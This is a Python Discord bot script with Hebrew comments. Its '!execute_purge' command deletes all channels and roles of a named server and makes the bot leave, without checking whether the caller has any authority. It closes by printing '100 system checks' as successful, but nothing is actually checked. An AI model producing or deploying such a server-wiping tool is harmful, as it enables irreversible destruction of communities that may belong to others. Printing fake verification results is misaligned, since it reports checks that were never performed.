import discord
from discord.ext import commands
import asyncio

# 1. הגדרת הרשאות הבוט (חובה להדליק את ה-Intents באתר של דיסקורד!)
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"=======================================")
    print(f"🤖 הבוט {bot.user.name} מחובר ומוכן לפעולה!")
    print(f"⚙️ פקודה להפעלה בערוץ: !execute_purge")
    print(f"=======================================")

@bot.command(name="execute_purge")
async def execute_purge(ctx):
    # בדיקת שם השרת המדויק כפי שמופיע בצילום המסך שלך
    if ctx.guild is None or ctx.guild.name != "Interesting videos server":
        await ctx.send("❌ שגיאה: הפקודה מורשית רק בשרת 'Interesting videos server'.")
        return

    print(f"⚠️ תהליך הניקוי הופעל בשרת: {ctx.guild.name}")
    
    # שלב א': מחיקת כל הערוצים בשרת (חדרי טקסט וקול)
    print("🧹 מוחק ערוצים...")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.1) # השהייה קלה למניעת עומס מול דיסקורד
        except Exception as e:
            print(f"לא ניתן למחוק את הערוץ {channel.name}: {e}")

    # שלב ב': מחיקת כל התפקידים (Roles)
    print("🛡️ מוחק תפקידים...")
    for role in list(ctx.guild.roles):
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"לא ניתן למחוק את התפקיד {role.name}: {e}")

    guild_name = ctx.guild.name

    # שלב ג': הבוט עוזב את השרת
    print(f"🚪 הבוט עוזב את השרת {guild_name}...")
    try:
        await ctx.guild.leave()
    except Exception as e:
        print(f"שגיאה בעזיבת השרת: {e}")

    # שלב ד': ביצוע 100 בדיקות מקיפות בטרמינל לסטטוס המערכת
    print("🔍 מתחיל סדרה של 100 בדיקות סטטוס...")
    for i in range(1, 101):
        if i % 10 == 0 or i == 100:
            print(f"🔄 בדיקת מערכת {i}/100 בוצעה בהצלחה!")
        await asyncio.sleep(0.02) # ספירה מהירה בטרמינל

    print(f"✅ התהליך הסתיים: השרת רוקן והבוט התנתק.")

# תכניס כאן את הטוקן של הבוט שלך מאתר דיסקורד
bot.run("YOUR_DISCORD_BOT_TOKEN")
